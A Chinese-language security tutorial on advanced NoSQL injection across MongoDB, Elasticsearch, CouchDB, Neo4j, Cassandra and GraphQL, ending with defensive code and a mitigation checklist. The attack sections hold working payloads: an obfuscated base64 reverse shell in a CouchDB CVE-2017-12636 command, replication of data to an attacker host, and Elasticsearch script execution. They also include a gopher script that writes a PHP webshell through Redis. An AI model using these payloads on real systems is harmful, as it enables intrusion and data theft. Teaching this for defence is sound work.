---
title: "NoSQL注入深度技术"
type: docs
weight: 9
---

## NoSQL注入深度技术

前文已介绍MongoDB操作符注入和Redis未授权访问的基础利用方式。本节将深入NoSQL注入的技术细节——覆盖MongoDB高级注入手法（聚合管道、二阶注入、时间盲注）、其他NoSQL数据库（Elasticsearch、CouchDB、Neo4j、Cassandra、GraphQL）的注入技术、自动化攻击工具链，以及系统化的防御方案。

### MongoDB高级注入技术

#### 聚合管道注入

MongoDB的聚合框架（Aggregation Pipeline）是数据处理的核心能力，也是被严重低估的攻击面。当应用将用户输入直接传入`$match`、`$group`、`$project`等聚合阶段时，攻击者可以注入操作符篡改数据处理逻辑。

**漏洞代码示例：**

```javascript
// 统计接口：按用户指定字段分组统计
app.get('/api/stats', async (req, res) => {
    const groupField = req.query.field;  // 用户可控的分组字段
    const pipeline = [
        { $match: { status: 'active' } },
        { $group: {
            _id: `$${groupField}`,       // 注入点：字段引用
            count: { $sum: 1 }
        }}
    ];
    const result = await db.collection('orders').aggregate(pipeline);
    res.json(result);
});
```

**攻击Payload：**

```javascript
// 正常请求：GET /api/stats?field=category
// 注入请求：通过$group的_id注入嵌套操作

// 攻击1：提取users集合的数据（跨集合读取）
// 当groupField被注入为嵌套管道表达式时
GET /api/stats?field=status"}},{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"userData"}},{"$unwind":"$userData"},{"$group":{"_id":"$userData.password","count":{"$sum":1

// 攻击2：通过$accumulator注入自定义JavaScript
// MongoDB 4.4+支持$accumulator和$function操作符
GET /api/stats?field=status"}},{"$group":{"_id":null,"data":{"$accumulator":{"init":"function(){return ''}","accumulate":"function(s,d){return s+JSON.stringify(d)}","accumulateArgs":["$$ROOT"],"merge":"function(s1,s2){return s1+s2}","lang":"js"}}}
```

**注入原理分析：**

聚合管道注入的核心在于管道阶段的序列化方式。当应用使用字符串拼接构建聚合管道时，攻击者可以闭合当前阶段并追加新的阶段。这与SQL注入中闭合`SELECT`语句追加`UNION SELECT`的思路类似，但操作的是JSON/BSON结构。

```text
正常管道:  [{$match: {status: "active"}}, {$group: {_id: "$category", count: {$sum: 1}}}]
注入管道:  [{$match: {status: "active"}}, {$group: {_id: "$category\"}},{$lookup:{from:\"users\"...}}}]
```

#### $where与JavaScript注入进阶

`$where`操作符允许在查询中执行JavaScript代码，是MongoDB中最危险的注入点。前文已展示基础绕过，此处深入高级利用技术。

**条件竞争型注入：**

```javascript
// 当应用使用时序验证（如CSRF token检查）时，$where可以引入延迟
{$where: "sleep(5000) || this.password == 'admin'"}
// 利用sleep判断注入是否执行——时间盲注变体
```

**数据外带（Out-of-Band）：**

```javascript
// 通过JavaScript的httpRequest能力外带数据
// MongoDB 3.6+中，$where不能直接发起网络请求
// 但可以通过以下方式间接实现：

// 方法1：错误信息外带
{$where: "if(this.role=='admin'){throw this.password}else{return true}"}
// 触发的异常信息中包含password值

// 方法2：结合聚合管道的$lookup外带
// 构造管道将数据注入到特定字段，然后通过正常查询接口读取
```

**JavaScript函数注入的完整示例：**

```javascript
// 漏洞代码
app.post('/search', async (req, res) => {
    const keyword = req.body.keyword;
    // 危险：将用户输入直接拼接到$where
    const query = {
        $where: `this.name.indexOf('${keyword}') >= 0`
    };
    const results = await db.collection('products').find(query);
    res.json(results);
});

// 攻击Payload
{
    "keyword": "') || 1==1 || (this.name.indexOf('"
}
// 拼接后: this.name.indexOf('') || 1==1 || (this.name.indexOf('')) >= 0
// 结果: 返回所有记录

// 提取数据Payload
{
    "keyword": "') || (()=>{throw this.password})() || (this.name.indexOf('"
}
// 通过异常信息泄露密码
```

#### MongoDB时间盲注

当应用不返回查询结果的差异信息时，可以通过时间延迟进行盲注。

**操作符级时间盲注：**

```javascript
// 利用$sleep操作符（MongoDB 4.2+的$function中使用）
// 漏洞代码：接受JSON格式的查询条件
app.post('/api/check', async (req, res) => {
    const filter = req.body.filter;
    // 类型检查不充分，仅检查filter是否为对象
    const result = await db.collection('secrets').findOne(filter);
    res.json({ exists: !!result });
});

// 攻击Payload：判断username是否以'a'开头
{
    "filter": {
        "$expr": {
            "$function": {
                "body": "function(){if(this.username.match(/^a/)){sleep(3000)};return true}",
                "args": [],
                "lang": "js"
            }
        }
    }
}
```

**JavaScript sleep时间盲注：**

```javascript
// 经典$where时间盲注
// 如果密码第一个字符是'a'，延迟5秒响应
{
    "password": {
        "$where": "if(this.password.charAt(0)=='a'){var x=new Date().getTime();while(new Date().getTime()-x<5000){};return true}return true"
    }
}

// 更高效的方式：利用正则回溯（ReDoS）
// 正则匹配失败时产生大量回溯，导致延迟
{
    "password": {
        "$regex": "^(?=a)aaaaaaaaaaaaaaaaaaaaaaaaaaa$"
    }
}
// 如果密码以'a'开头，正则引擎尝试大量回溯，产生延迟
```

#### 二阶NoSQL注入

二阶注入（Second-Order Injection）是指攻击者先将恶意数据存储到数据库中，在后续查询中触发注入。在MongoDB场景中，这通常发生在以下模式中：

**存储型操作符注入：**

```javascript
// 第一阶段：用户注册时存储恶意字段
app.post('/register', async (req, res) => {
    const user = {
        username: req.body.username,
        // 漏洞：未校验preferences字段类型
        preferences: req.body.preferences,
        createdAt: new Date()
    };
    await db.collection('users').insertOne(user);
});

// 攻击者注册时提交：
{
    "username": "attacker",
    "preferences": {
        "role": {"$ne": ""},
        "$where": "this.role=='admin'"
    }
}

// 第二阶段：其他功能查询用户偏好时触发
app.get('/api/dashboard', async (req, res) => {
    const user = await db.collection('users').findOne({ username: req.user });
    // 查询使用了用户存储的preferences作为过滤条件
    const settings = await db.collection('settings').find(user.preferences);
    // preferences中包含的$ne操作符会被MongoDB执行
});
```

**数组注入：**

```javascript
// 漏洞代码：检查用户标签
app.get('/api/posts', async (req, res) => {
    const tags = req.query.tags.split(',');
    // 直接使用split结果作为$in查询
    const posts = await db.collection('posts').find({
        tags: { $in: tags }
    }).toArray();
});

// 正常请求：GET /api/posts?tags=nodejs,mongodb
// 注入请求：利用MongoDB数组解析特性
// 某些框架在解析application/x-www-form-urlencoded时会将
// tags[$ne]= 转换为 {tags: {$ne: ""}}
```

### Elasticsearch注入

Elasticsearch在企业环境中广泛使用，其查询DSL（Domain Specific Language）基于JSON，注入模式与MongoDB类似但有独特之处。

#### Query DSL注入

```javascript
// 漏洞代码：直接拼接用户输入到查询
app.get('/api/search', async (req, res) => {
    const keyword = req.body.keyword;
    const query = {
        query: {
            match: {
                content: keyword
            }
        }
    };
    const result = await client.search({ index: 'articles', body: query });
    res.json(result.hits.hits);
});
```

**注入攻击方式：**

```json
// 攻击1：替换整个查询，读取所有数据
{
    "keyword": {
        "match_all": {}
    }
}

// 攻击2：通过bool注入添加条件
{
    "keyword": {
        "query": "test",
        "boost": 1.0
    }
}

// 攻击3：利用script_score注入脚本（Elasticsearch < 1.4.3 MVEL RCE）
{
    "query": {
        "function_score": {
            "query": {"match_all": {}},
            "functions": [{
                "script_score": {
                    "script": "import java.lang.Runtime; Runtime.getRuntime().exec('id')"
                }
            }]
        }
    }
}
```

**Painless脚本注入（Elasticsearch 5.0+）：**

```json
// 利用Painless脚本语言读取系统信息
{
    "query": {
        "function_score": {
            "query": {"match_all": {}},
            "functions": [{
                "script_score": {
                    "script": {
                        "source": "def proc = new ProcessBuilder(['/bin/bash','-c','id']).start(); proc.waitFor(); return proc.getText()"
                    }
                }
            }]
        }
    }
}

// 敏感字段提取
{
    "query": {
        "script": {
            "script": {
                "source": "doc['password.keyword'].value"
            }
        }
    }
}
```

#### Elasticsearch未授权访问

```bash
# 检测Elasticsearch未授权访问
curl -s http://target:9200/
# 返回集群信息表示无认证

# 枚举索引
curl -s http://target:9200/_cat/indices?v

# 读取敏感数据
curl -s http://target:9200/users/_search?pretty
curl -s http://target:9200/.kibana/_search?pretty

# 导出全部数据
curl -s http://target:9200/_snapshot?pretty
# 创建快照仓库到攻击者控制的服务器

# 集群节点信息
curl -s http://target:9200/_nodes?pretty
# 获取内网IP、ES版本、JVM版本等信息
```

### CouchDB注入与漏洞利用

#### CVE-2017-12635：JSON解析差异导致权限提升

Apache CouchDB在处理JSON请求体时，Erlang端和JavaScript端对重复键的处理方式不同——Erlang取最后一个值，JavaScript取第一个值。攻击者可以利用这个差异绕过权限检查。

```json
// 攻击请求：创建管理员用户
PUT /_users/org.couchdb.user:attacker HTTP/1.1
Content-Type: application/json
Host: target:5984

{
    "type": "user",
    "name": "attacker",
    "roles": ["_admin"],
    "roles": [],
    "password": "attacker123"
}

// Erlang解析结果：roles = []（通过权限检查）
// JavaScript解析结果：roles = ["_admin"]（获得管理员权限）
```

#### CVE-2017-12636：命令执行漏洞

CouchDB 2.x在暴露了`_config`接口时，攻击者可以修改`query_server`配置，将JavaScript查询引擎替换为任意可执行文件。

```bash
# 步骤1：通过CVE-2017-12635获取管理员权限

# 步骤2：修改query_server配置
curl -X PUT http://target:5984/_config/query_servers/cmd \
    -H "Content-Type: application/json" \
    -d '"/bin/bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\""' \
    -u attacker:attacker123

# 步骤3：创建数据库并触发执行
curl -X PUT http://target:5984/evil_db -u attacker:attacker123
curl -X PUT http://target:5984/evil_db/doc -u attacker:attacker123 \
    -d '{"_id":"cmd"}'
```

#### CouchDB批量数据泄露

```bash
# 枚举所有数据库
curl -s http://target:5984/_all_dbs

# 读取任意数据库内容
curl -s http://target:5984/<database>/_all_docs?include_docs=true

# 访问管理接口
curl -s http://target:5984/_utils/

# 复制数据库到攻击者控制的CouchDB
curl -X POST http://target:5984/_replicate \
    -H "Content-Type: application/json" \
    -d '{"source":"sensitive_db","target":"http://attacker:5984/sensitive_db"}'
```

### Neo4j注入（Cypher注入）

Neo4j使用Cypher查询语言，当应用将用户输入直接拼接到Cypher语句中时，存在注入风险。

#### 基础注入

```java
// 漏洞代码（Java + Neo4j Driver）
String username = request.getParameter("username");
String query = "MATCH (u:User {name: '" + username + "'}) RETURN u";
Result result = graphDb.execute(query);

// 攻击Payload：' OR 1=1 RETURN u //
// 拼接后: MATCH (u:User {name: '' OR 1=1 RETURN u //'}) RETURN u
// 实际执行: MATCH (u:User) RETURN u  -- 返回所有用户
```

#### UNION注入提取数据

```cypher
// 攻击Payload: ' RETURN u UNION MATCH (s:Secret) RETURN s //
// 完整查询:
// MATCH (u:User {name: '' RETURN u UNION MATCH (s:Secret) RETURN s //'}) RETURN u

// 提取标签信息
' CALL db.labels() YIELD label RETURN label //

// 提取属性名
' CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey //

// 提取关系类型
' CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType //
```

#### Cypher时间盲注

```cypher
// 利用APOC库的sleep函数
' RETURN apoc.util.sleep(5000) //

// 利用子查询进行布尔判断
' RETURN CASE WHEN 1=1 THEN apoc.util.sleep(5000) ELSE 0 END //
```

### Cassandra注入（CQL注入）

Apache Cassandra使用CQL（Cassandra Query Language），语法类似SQL但有本质区别。

```sql
-- 漏洞代码
query = "SELECT * FROM users WHERE name = '" + username + "' ALLOW FILTERING"

-- 注入Payload: ' OR name='admin' ALLOW FILTERING --
-- CQL不支持多语句执行（无堆叠注入），但支持条件修改

-- 密码重置类注入
-- 如果应用逻辑如下：
-- 1. 查询: SELECT * FROM users WHERE email = '输入' AND reset_token = 'token'
-- 2. 如果找到记录，重置密码

-- 注入: ' OR email='admin@example.com' AND reset_token='guess' ALLOW FILTERING
-- 条件注入可以绕过AND条件

-- 数据枚举
-- Cassandra的系统表包含集群元数据
' UNION SELECT * FROM system_schema.keyspaces --
' UNION SELECT * FROM system_schema.tables --
```

**CQL注入的限制：**

| 特性 | CQL | SQL |
|------|-----|-----|
| 多语句执行 | 不支持 | 部分支持 |
| 子查询 | 不支持 | 支持 |
| UNION查询 | 受限 | 完全支持 |
| 系统表访问 | `system_schema.*` | `information_schema` |
| 注释 | `--`和`/**/` | `--`、`#`、`/**/` |

### GraphQL注入与滥用

GraphQL不仅是一种API查询语言，其过度查询、内省机制和批量操作都可被滥用。

#### 内省泄露

```graphql
# 获取完整Schema（获取后可以精准构造攻击）
{
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
            name
            kind
            fields {
                name
                type { name kind ofType { name kind } }
                args { name type { name } }
            }
            enumValues { name }
        }
        directives { name locations args { name type { name } } }
    }
}

# 枚举敏感类型
{
    __type(name: "User") {
        fields {
            name
            type { name }
        }
    }
}
# 输出可能包含: id, username, email, password_hash, role, api_token, ssn...
```

#### 深度嵌套查询（DoS）

```graphql
# 利用关系嵌套消耗服务器资源
# 假设User->Posts->Comments->Author->Posts->...存在循环引用
{
    users(first: 100) {
        posts(first: 100) {
            comments(first: 100) {
                author {
                    posts(first: 100) {
                        comments(first: 100) {
                            author {
                                posts(first: 100) {
                                    comments(first: 100) {
                                        content
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

#### 批量查询攻击

```graphql
# 在单个HTTP请求中发送大量查询
# 绕过基于请求频率的限流
query op1 { user(id: 1) { email } }
query op2 { user(id: 2) { email } }
query op3 { user(id: 3) { email } }
# ... 数千个操作

# 别名批量查询（更紧凑）
{
    u1: user(id: 1) { email }
    u2: user(id: 2) { email }
    u3: user(id: 3) { email }
    # ... 数千个别名
}
```

#### GraphQL注入参数

```graphql
# 当GraphQL resolver后端使用字符串拼接查询时
mutation {
    updateUser(
        id: 1,
        name: "admin' OR '1'='1",
        email: "admin@example.com"
    ) { id name }
}

# NoSQL操作符注入（如果resolver直接传递参数到MongoDB）
mutation {
    updateUser(
        filter: { username: "admin", password: { ne: "" } }
    ) { id role }
}
```

### SSRF联动的NoSQL攻击

当NoSQL数据库不直接暴露但应用存在SSRF漏洞时，可以通过SSRF间接攻击。

#### Gopher协议攻击Redis

```python
#!/usr/bin/env python3
"""
通过SSRF漏洞利用Gopher协议攻击内网Redis
需要目标应用支持gopher://协议或存在CRLF注入
"""
import urllib.parse

def redis_cmd_to_gopher(host, port, commands):
    """将Redis RESP协议命令转换为Gopher URL"""
    payload = ""
    for cmd in commands:
        parts = cmd.split()
        payload += f"*{len(parts)}\r\n"
        for part in parts:
            payload += f"${len(part)}\r\n{part}\r\n"

    encoded = urllib.parse.quote(payload, safe='')
    return f"gopher://{host}:{port}/_{encoded}"

# 生成写入WebShell的Gopher URL
commands = [
    "FLUSHALL",
    "SET x <?php system($_GET['cmd']); ?>",
    "CONFIG SET dir /var/www/html/",
    "CONFIG SET dbfilename shell.php",
    "SAVE"
]

gopher_url = redis_cmd_to_gopher("127.0.0.1", 6379, commands)
print(gopher_url)

# 使用方式：将gopher_url作为SSRF的参数值
# http://victim.com/fetch?url=<gopher_url>
```

#### HTTP协议攻击Elasticsearch

```bash
# 如果应用存在SSRF且内网有Elasticsearch
# 可以通过HTTP请求直接访问ES API

# 通过SSRF访问
http://victim.com/proxy?url=http://192.168.1.100:9200/_cat/indices
http://victim.com/proxy?url=http://192.168.1.100:9200/users/_search?size=100

# 如果SSRF支持POST，可以执行搜索查询
```

### NoSQL注入自动化工具

#### NoSQLMap

```bash
# 安装
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt

# 交互模式
python nosqlmap.py

# 工具功能：
# 1. MongoDB认证绕过测试（自动测试所有操作符）
# 2. MongoDB数据库枚举
# 3. MongoDB GridFS文件提取
# 4. JavaScript注入测试
# 5. 数据库克隆（dump）
```

#### Burp Suite NoSQL注入检测

```text
手动测试流程：
1. 拦截登录/搜索请求
2. 发送到Repeater，修改Content-Type为application/json
3. 替换参数值为操作符对象：
   - {"$ne":""}
   - {"$gt":""}
   - {"$regex":".*"}
   - {"$exists":true}
   - {"$in":["admin","root","test"]}
4. 观察响应差异
5. 有效果则发送到Intruder批量测试

Intruder自动化：
1. 标记注入位置
2. 使用Payload Lists加载NoSQL操作符字典
3. Grep Match设置关键词：token、success、role、admin
4. 根据响应长度/关键词差异识别成功注入
```

#### 自定义Python扫描脚本

```python
#!/usr/bin/env python3
"""
NoSQL注入扫描器 - 支持MongoDB/Elasticsearch/GraphQL
"""
import requests
import json
import sys
import time
from typing import Dict, List, Optional

class NoSQLScanner:
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.session = requests.Session()
        self.findings = []

    def test_mongo_operators(self, param: str, value: str = "") -> List[Dict]:
        """测试MongoDB操作符注入"""
        operators = [
            ("$ne", "", "不等于"),
            ("$gt", "", "大于"),
            ("$gte", "", "大于等于"),
            ("$lt", "zzzzzzzzzz", "小于"),
            ("$regex", ".*", "正则匹配"),
            ("$exists", True, "字段存在"),
            ("$in", ["admin", "root"], "列表匹配"),
            ("$nin", [""], "列表排除"),
            ("$not", {"$regex": ""}, "正则取反"),
            ("$or", [{"password": ""}, {"role": "admin"}], "或条件"),
        ]

        results = []
        for op, val, desc in operators:
            payload = {param: {op: val}}
            try:
                start = time.time()
                resp = self.session.post(
                    self.target,
                    json=payload,
                    timeout=self.timeout
                )
                elapsed = time.time() - start

                finding = {
                    "operator": op,
                    "description": desc,
                    "status": resp.status_code,
                    "time_ms": int(elapsed * 1000),
                    "response_length": len(resp.text),
                    "response_preview": resp.text[:200]
                }

                # 检测成功指标
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        if body.get("success") or body.get("token"):
                            finding["result"] = "BYPASS_SUCCESS"
                        elif body.get("data") and len(str(body["data"])) > 50:
                            finding["result"] = "DATA_LEAK"
                    except json.JSONDecodeError:
                        if "admin" in resp.text.lower() and "error" not in resp.text.lower():
                            finding["result"] = "POSSIBLE_BYPASS"

                results.append(finding)

            except requests.Timeout:
                results.append({"operator": op, "result": "TIMEOUT"})
            except Exception as e:
                results.append({"operator": op, "error": str(e)})

        return results

    def test_elasticsearch_dsl(self, param: str) -> List[Dict]:
        """测试Elasticsearch DSL注入"""
        payloads = [
            {"match_all": {}},
            {"bool": {"must": [{"match_all": {}}]}},
            {"query_string": {"query": "*"}},
            {"wildcard": {"*": "*"}},
        ]
        results = []
        for payload in payloads:
            try:
                body = {param: payload}
                resp = self.session.post(self.target, json=body, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > 100:
                    results.append({
                        "payload": json.dumps(payload),
                        "result": "INJECTABLE",
                        "response_size": len(resp.text)
                    })
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    def test_graphql_introspection(self) -> Optional[Dict]:
        """测试GraphQL内省是否开启"""
        queries = [
            '{__schema{types{name fields{name}}}}',
            '{__type(name:"Query"){fields{name type{name}}}}',
            '{__type(name:"User"){fields{name type{name}}}}',
        ]
        for query in queries:
            try:
                resp = self.session.post(
                    self.target,
                    json={"query": query},
                    timeout=self.timeout
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if "data" in data and data["data"]:
                        return {
                            "introspection": True,
                            "schema_data": data["data"],
                            "query": query
                        }
            except Exception:
                continue
        return None

    def test_graphql_batch(self, query_template: str, count: int = 100) -> Dict:
        """测试GraphQL批量查询"""
        batch = []
        for i in range(count):
            batch.append({
                "operationName": f"op{i}",
                "query": query_template.replace("{ID}", str(i))
            })

        try:
            start = time.time()
            resp = self.session.post(
                self.target,
                json=batch,
                timeout=self.timeout * 3
            )
            elapsed = time.time() - start
            return {
                "batch_size": count,
                "status": resp.status_code,
                "time_seconds": round(elapsed, 2),
                "no_rate_limit": resp.status_code == 200
            }
        except Exception as e:
            return {"error": str(e)}

    def generate_report(self, results: Dict) -> str:
        """生成扫描报告"""
        report = []
        report.append(f"{'='*60}")
        report.append(f"NoSQL注入扫描报告")
        report.append(f"目标: {self.target}")
        report.append(f"{'='*60}\n")

        for category, items in results.items():
            report.append(f"[{category}]")
            if isinstance(items, list):
                for item in items:
                    status = item.get("result", item.get("error", "UNKNOWN"))
                    report.append(f"  {item.get('operator', item.get('payload', ''))}: {status}")
            elif isinstance(items, dict):
                for k, v in items.items():
                    report.append(f"  {k}: {v}")
            report.append("")

        return "\n".join(report)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("用法: python nosql_scanner.py <type> <target>")
        print("类型: mongo | elastic | graphql")
        sys.exit(1)

    scan_type = sys.argv[1]
    target = sys.argv[2]
    scanner = NoSQLScanner(target)

    results = {}
    if scan_type == "mongo":
        results["MongoDB操作符注入"] = scanner.test_mongo_operators("password")
    elif scan_type == "elastic":
        results["Elasticsearch DSL注入"] = scanner.test_elasticsearch_dsl("query")
    elif scan_type == "graphql":
        introspection = scanner.test_graphql_introspection()
        if introspection:
            results["GraphQL内省"] = introspection
            results["GraphQL批量查询"] = scanner.test_graphql_batch(
                "query op{ID}{user(id:{ID}){email}}"
            )

    print(scanner.generate_report(results))
```

### 防御方案

#### MongoDB操作符注入防御

```javascript
// === 防御层级1：输入类型严格校验（必须） ===
function sanitizeMongoInput(input) {
    // 只允许字符串和数字，拒绝对象（操作符）
    if (typeof input === 'string') {
        return input;
    }
    if (typeof input === 'number' && isFinite(input)) {
        return input;
    }
    if (Array.isArray(input)) {
        return input.map(sanitizeMongoInput);
    }
    // 对象类型一律拒绝——这是防御操作符注入的关键
    throw new Error('Invalid input type: object not allowed');
}

// === 防御层级2：使用Mongoose ODM + Schema验证 ===
const UserSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        match: /^[a-zA-Z0-9_]{3,50}$/,
        index: true
    },
    password: {
        type: String,
        required: true,
        select: false  // 查询时默认不返回密码字段
    }
});

// === 防御层级3：禁用$where和$accumulator ===
// 在查询前过滤掉危险操作符
function sanitizeQuery(query) {
    const DANGEROUS_OPS = ['$where', '$accumulator', '$function', '$expr'];
    const sanitized = {};
    for (const [key, value] of Object.entries(query)) {
        if (DANGEROUS_OPS.includes(key)) {
            throw new Error(`Forbidden operator: ${key}`);
        }
        if (typeof value === 'object' && value !== null) {
            sanitized[key] = sanitizeQuery(value);
        } else {
            sanitized[key] = value;
        }
    }
    return sanitized;
}

// === 防御层级4：MongoDB服务器配置 ===
// 在mongod.conf中禁用JavaScript执行
// security:
//   javascriptEnabled: false
// 这将完全禁用$where、$accumulator、$function操作符
```

#### Elasticsearch防御

```javascript
// 1. 始终启用X-Pack安全认证
// elasticsearch.yml:
// xpack.security.enabled: true

// 2. 使用参数化查询而非字符串拼接
const body = {
    query: {
        match: { content: userInput }  // 直接传递值，不拼接DSL
    }
};

// 3. 禁用脚本执行
// elasticsearch.yml:
// script.allowed_types: none
// 或限制为沙箱脚本
// script.allowed_types: inline
// script.allowed_contexts: score

// 4. 限制搜索结果大小
// index.max_result_window: 10000
// 防止一次查询返回过多数据

// 5. 启用字段级安全（FLS）
// 限制敏感字段的访问
```

#### GraphQL防御

```javascript
// 1. 禁用生产环境内省
const server = new ApolloServer({
    schema,
    introspection: process.env.NODE_ENV !== 'production'
});

// 2. 查询深度限制
const depthLimit = require('graphql-depth-limit');
app.use('/graphql', depthLimit(7));  // 最大嵌套深度7层

// 3. 查询复杂度限制
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const validationRules = [createComplexityLimitRule(1000)];

// 4. 批量查询限制
// 限制单个请求中的操作数量
const server = new ApolloServer({
    schema,
    plugins: [{
        requestDidStart() {
            return {
                didResolveOperation({ request, document }) {
                    const operations = document.definitions.filter(
                        d => d.kind === 'OperationDefinition'
                    );
                    if (operations.length > 10) {
                        throw new Error('Too many operations in single request');
                    }
                }
            };
        }
    }]
});

// 5. 速率限制
const rateLimit = require('express-rate-limit');
app.use('/graphql', rateLimit({
    windowMs: 60 * 1000,
    max: 100
}));

// 6. 参数化查询到后端
// GraphQL resolver中使用参数化查询而非字符串拼接
const resolvers = {
    Query: {
        user: async (_, { id }) => {
            // 使用参数化查询
            return db.collection('users').findOne({ _id: new ObjectId(id) });
        }
    }
};
```

#### 通用防御清单

| 防御措施 | 适用数据库 | 优先级 | 说明 |
|----------|-----------|--------|------|
| 输入类型校验 | MongoDB | 必须 | 拒绝对象类型输入，只接受字符串/数字 |
| 使用ODM/驱动的查询构建器 | 所有 | 必须 | Mongoose、PyMongo等自动处理参数化 |
| 禁用JavaScript执行 | MongoDB | 高 | `javascriptEnabled: false` |
| 启用认证 | 所有 | 必须 | MongoDB、ES、Redis、CouchDB都必须设置密码 |
| 最小权限原则 | 所有 | 高 | 不使用root/admin运行数据库 |
| 查询深度限制 | GraphQL | 高 | 防止深度嵌套DoS |
| 禁用内省 | GraphQL | 生产必须 | 防止Schema泄露 |
| 脚本执行白名单 | ES/MongoDB | 高 | 仅允许沙箱脚本 |
| 定期审计查询日志 | 所有 | 中 | 检测异常查询模式 |
| WAF/网关层过滤 | 所有 | 中 | 检测已知攻击模式 |

### 常见误区与陷阱

**误区一：NoSQL不需要防御注入**

许多开发者认为NoSQL数据库使用JSON查询而非SQL语句，所以不存在注入风险。事实恰恰相反——NoSQL注入的攻击面更广，因为查询语言是图灵完备的（MongoDB的$where支持任意JavaScript），攻击者可以执行的恶意操作远超SQL注入。

**误区二：类型检查可以防止所有NoSQL注入**

虽然`typeof input === 'string'`可以防御MongoDB操作符注入，但无法防御JavaScript注入（$where拼接）、GraphQL参数注入、Cypher注入等其他类型。防御必须是多层级的。

**误区三：ODM完全消除了注入风险**

Mongoose等ODM提供了Schema验证和类型安全，但如果开发者在聚合管道中使用字符串拼接、在$where中拼接用户输入，ODM无法提供保护。ODM是重要的安全层，但不是万能的。

**误区四：Redis加了密码就安全了**

`requirepass`只是一道防线。如果应用层存在SSRF漏洞，攻击者可以通过Gopher协议绕过认证直接发送Redis命令。需要同时做好网络隔离（bind + 防火墙）和应用层SSRF防护。
